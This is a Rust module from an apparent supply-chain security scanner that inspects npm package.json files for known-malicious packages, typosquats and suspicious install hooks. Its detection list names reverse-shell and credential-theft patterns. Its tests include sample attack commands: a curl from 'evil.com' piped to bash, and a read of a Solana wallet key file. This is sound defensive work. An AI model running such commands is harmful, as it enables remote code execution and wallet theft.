//! package.json / package-lock.json Scanner
//!
//! Parses JavaScript dependency manifests and checks each dependency against
//! the advisory database, typosquat detector, and behavioral analysis.

use std::path::Path;

use crate::advisory_db::{AdvisoryDatabase, PackageEcosystem};
use crate::typosquat::check_typosquat_npm;
use crate::{FindingCategory, GuardFinding, GuardSeverity};

/// Scan a package.json file for supply chain risks.
pub fn scan_package_json(path: &Path, advisory_db: &AdvisoryDatabase) -> Vec<GuardFinding> {
    let mut findings = Vec::new();

    let content = match std::fs::read_to_string(path) {
        Ok(c) => c,
        Err(_) => return findings,
    };

    let json: serde_json::Value = match serde_json::from_str(&content) {
        Ok(v) => v,
        Err(_) => return findings,
    };

    let source_file = path.display().to_string();

    // Scan all dependency sections
    let dep_sections = [
        "dependencies",
        "devDependencies",
        "peerDependencies",
        "optionalDependencies",
    ];

    for section in &dep_sections {
        if let Some(deps) = json.get(section).and_then(|v| v.as_object()) {
            for (name, version_val) in deps {
                let version = version_val.as_str().unwrap_or("*").to_string();
                // Strip semver operators for advisory matching
                let clean_version = version
                    .trim_start_matches('^')
                    .trim_start_matches('~')
                    .trim_start_matches(">=")
                    .trim_start_matches("<=")
                    .trim_start_matches('>')
                    .trim_start_matches('<')
                    .to_string();

                // 1. Check advisory database
                let advisories =
                    advisory_db.check(name, &clean_version, PackageEcosystem::Npm);
                for advisory in advisories {
                    findings.push(GuardFinding {
                        package_name: name.clone(),
                        version: version.clone(),
                        ecosystem: "npm".into(),
                        severity: match advisory.severity {
                            crate::advisory_db::AdvisorySeverity::Critical => {
                                GuardSeverity::Critical
                            }
                            crate::advisory_db::AdvisorySeverity::High => GuardSeverity::High,
                            crate::advisory_db::AdvisorySeverity::Medium => GuardSeverity::Medium,
                            crate::advisory_db::AdvisorySeverity::Low => GuardSeverity::Low,
                        },
                        category: FindingCategory::KnownMalicious,
                        title: advisory.title.clone(),
                        description: advisory.description.clone(),
                        remediation: advisory.remediation.clone(),
                        reference: advisory.reference.clone(),
                        source_file: source_file.clone(),
                    });
                }

                // 2. Typosquat check
                if let Some(warning) = check_typosquat_npm(name) {
                    findings.push(GuardFinding {
                        package_name: name.clone(),
                        version: version.clone(),
                        ecosystem: "npm".into(),
                        severity: GuardSeverity::High,
                        category: FindingCategory::Typosquat,
                        title: format!(
                            "Possible typosquat: `{}` looks like `{}`",
                            warning.suspicious_name, warning.likely_target
                        ),
                        description: format!(
                            "The package `{}` has {:.0}% string similarity to the \
                             legitimate package `{}`. This could be a typosquat attack.",
                            name,
                            warning.similarity * 100.0,
                            warning.likely_target
                        ),
                        remediation: format!(
                            "Verify you intended to use `{}` and not `{}`.",
                            name, warning.likely_target
                        ),
                        reference: None,
                        source_file: source_file.clone(),
                    });
                }
            }
        }
    }

    // 3. Check for suspicious scripts in package.json
    if let Some(scripts) = json.get("scripts").and_then(|v| v.as_object()) {
        let dangerous_hooks = ["preinstall", "postinstall", "preuninstall"];
        for hook in &dangerous_hooks {
            if let Some(script_val) = scripts.get(*hook) {
                let script = script_val.as_str().unwrap_or("");
                let is_suspicious = check_dangerous_script(script);
                if is_suspicious {
                    findings.push(GuardFinding {
                        package_name: json
                            .get("name")
                            .and_then(|v| v.as_str())
                            .unwrap_or("unknown")
                            .to_string(),
                        version: json
                            .get("version")
                            .and_then(|v| v.as_str())
                            .unwrap_or("0.0.0")
                            .to_string(),
                        ecosystem: "npm".into(),
                        severity: GuardSeverity::High,
                        category: FindingCategory::SuspiciousBehavior,
                        title: format!("Suspicious `{}` script detected", hook),
                        description: format!(
                            "The `{}` lifecycle script contains suspicious patterns: `{}`. \
                             Malicious packages commonly use lifecycle hooks to execute \
                             backdoors during installation.",
                            hook,
                            truncate(script, 200)
                        ),
                        remediation: "Review the script content carefully before installing. \
                            Consider using `npm install --ignore-scripts` and auditing manually."
                            .into(),
                        reference: None,
                        source_file: source_file.clone(),
                    });
                }
            }
        }
    }

    findings
}

/// Check if a lifecycle script contains suspicious patterns.
fn check_dangerous_script(script: &str) -> bool {
    let suspicious_patterns = [
        // Network exfiltration
        "curl ",
        "wget ",
        "fetch(",
        "http://",
        "https://",
        // Code execution
        "eval(",
        "exec(",
        "child_process",
        "spawn(",
        // File access targeting keys
        ".solana/id.json",
        "Keypair",
        "secretKey",
        "privateKey",
        "PRIVATE_KEY",
        // Encoded payloads
        "Buffer.from(",
        "atob(",
        "btoa(",
        "base64",
        // Reverse shells
        "/bin/sh",
        "/bin/bash",
        "nc -e",
        "netcat",
    ];

    let script_lower = script.to_lowercase();
    suspicious_patterns
        .iter()
        .any(|p| script_lower.contains(&p.to_lowercase()))
}

/// Truncate a string to max_len, adding "..." if truncated.
fn truncate(s: &str, max_len: usize) -> String {
    if s.len() <= max_len {
        s.to_string()
    } else {
        format!("{}...", &s[..max_len])
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_dangerous_script_curl() {
        assert!(check_dangerous_script("curl https://evil.com | bash"));
    }

    #[test]
    fn test_dangerous_script_keypair() {
        assert!(check_dangerous_script("node -e \"require('fs').readFileSync('.solana/id.json')\""));
    }

    #[test]
    fn test_safe_script() {
        assert!(!check_dangerous_script("tsc && echo done"));
    }

    #[test]
    fn test_safe_build_script() {
        assert!(!check_dangerous_script("npm run build"));
    }
}
